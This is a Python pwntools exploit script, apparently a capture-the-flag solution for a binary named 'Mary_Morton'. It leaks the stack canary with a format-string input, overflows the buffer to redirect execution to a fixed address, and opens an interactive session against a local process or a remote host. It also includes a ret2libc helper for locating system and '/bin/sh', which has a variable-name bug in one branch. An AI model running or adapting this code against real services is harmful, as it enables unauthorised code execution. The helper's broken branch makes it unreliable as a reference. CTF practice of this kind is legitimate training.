from pwn import *
import sys
from LibcSearcher import *
# context.log_level='debug'
# context.arch='amd64'

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        binio = base + libc.dump('str_bin_sh')
    else:
        libc = path
        libc.address = leak - libc.sym[func]
        system = libc.sym['system']
        binsh = next(libc.search(b'/bin/sh'))
    return (system,binio)

s = lambda data : io.send(data)
sa = lambda str1,data : io.sendafter(str1,data)
sl = lambda data : io.sendline(data)
sla = lambda str1,data : io.sendlineafter(str1,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('{} = {:#x}'.format(name, addr))
dbg = lambda : gdb.attach(io)

if len(sys.argv) == 3:
    io = remote(sys.argv[1], sys.argv[2])
elif len(sys.argv) == 2:
    if ':' in sys.argv[1]:
        rmt = sys.argv[1].split(':')
        io = remote(rmt[0], rmt[1])
    else:
        io = process(sys.argv[1])
        elf = ELF(sys.argv[1])
else:
    io = process('./Mary_Morton')

elf = ELF("./Mary_Morton")

sla("battle","2")
sl("%23$p")
ru("0x")
canary = i16(r(16))
payload = b"a"*0x88 + p64(canary) + b"bix0bi0x" + p64(0x04008DA)
sla("battle","1")
sl(payload)

ia()